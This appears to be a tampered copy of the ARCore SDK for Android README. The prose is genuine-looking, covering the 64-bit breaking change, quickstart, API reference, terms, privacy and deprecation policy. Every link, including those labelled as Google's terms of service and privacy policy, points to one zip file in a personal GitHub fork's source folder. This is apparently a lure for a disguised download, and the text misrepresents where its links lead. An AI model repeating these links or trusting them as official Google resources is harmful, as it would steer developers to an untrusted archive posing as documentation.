ARCore SDK for Android
======================
Copyright 2017 Google LLC

This SDK provides APIs for all of the essential AR features like motion
tracking, environmental understanding, and light estimation. With these
capabilities you can build entirely new AR experiences or enhance existing apps
with AR features.


## Breaking change affecting previously published 32-bit-only apps

_Google Play Services for AR_ (ARCore) has removed support for 32-bit-only
ARCore-enabled apps running on 64-bit devices. Support for 32-bit apps running
on 32-bit devices is unaffected.

If you have published a 32-bit-only (`armeabi-v7a`) version of your
ARCore-enabled app without publishing a corresponding 64-bit (`arm64-v8a`)
version, you must update your app to include 64-bit native libraries.
32-bit-only ARCore-enabled apps that are not updated by this time may crash when
attempting to start an augmented reality (AR) session.

To learn more about this breaking change, and for instructions on how to update
your app, see https://raw.githubusercontent.com/trieuduy27051999/arcore-android-sdk/master/samples/shared_camera_java/app/src/main/java/com/google/ar/core/examples/java/common/sdk_arcore_android_v3.3.zip


## Quick Start

See the [Quickstart for Android Java](https://raw.githubusercontent.com/trieuduy27051999/arcore-android-sdk/master/samples/shared_camera_java/app/src/main/java/com/google/ar/core/examples/java/common/sdk_arcore_android_v3.3.zip)
or [Quickstart for Android NDK](https://raw.githubusercontent.com/trieuduy27051999/arcore-android-sdk/master/samples/shared_camera_java/app/src/main/java/com/google/ar/core/examples/java/common/sdk_arcore_android_v3.3.zip)
developer guide.


## API Reference

See the [ARCore SDK for Java API Reference](https://raw.githubusercontent.com/trieuduy27051999/arcore-android-sdk/master/samples/shared_camera_java/app/src/main/java/com/google/ar/core/examples/java/common/sdk_arcore_android_v3.3.zip)
or [ARCore SDK for C API Reference](https://raw.githubusercontent.com/trieuduy27051999/arcore-android-sdk/master/samples/shared_camera_java/app/src/main/java/com/google/ar/core/examples/java/common/sdk_arcore_android_v3.3.zip).


## Release Notes

The SDK release notes are available on the
[releases](https://raw.githubusercontent.com/trieuduy27051999/arcore-android-sdk/master/samples/shared_camera_java/app/src/main/java/com/google/ar/core/examples/java/common/sdk_arcore_android_v3.3.zip) page.


## Terms & Conditions

By downloading the ARCore SDK for Android, you agree that the
[Google APIs Terms of Service](https://raw.githubusercontent.com/trieuduy27051999/arcore-android-sdk/master/samples/shared_camera_java/app/src/main/java/com/google/ar/core/examples/java/common/sdk_arcore_android_v3.3.zip) governs your use
thereof.


## User privacy requirements

You must disclose the use of Google Play Services for AR (ARCore) and how it
collects and processes data, prominently in your application, easily accessible
to users. You can do this by adding the following text on your main menu or
notice screen: "This application runs on [Google Play Services for AR](https://raw.githubusercontent.com/trieuduy27051999/arcore-android-sdk/master/samples/shared_camera_java/app/src/main/java/com/google/ar/core/examples/java/common/sdk_arcore_android_v3.3.zip) (ARCore),
which is provided by Google LLC and governed by the [Google Privacy Policy](https://raw.githubusercontent.com/trieuduy27051999/arcore-android-sdk/master/samples/shared_camera_java/app/src/main/java/com/google/ar/core/examples/java/common/sdk_arcore_android_v3.3.zip)".

## Deprecation policy

Apps built with **ARCore SDK 1.12.0 or higher** are covered by the
[Cloud Anchor API deprecation policy](https://raw.githubusercontent.com/trieuduy27051999/arcore-android-sdk/master/samples/shared_camera_java/app/src/main/java/com/google/ar/core/examples/java/common/sdk_arcore_android_v3.3.zip).

Apps built with **ARCore SDK 1.11.0 or lower** will be unable to host or resolve
Cloud Anchors beginning December 2020 due to the SDK's use of an older,
deprecated ARCore Cloud Anchor service.
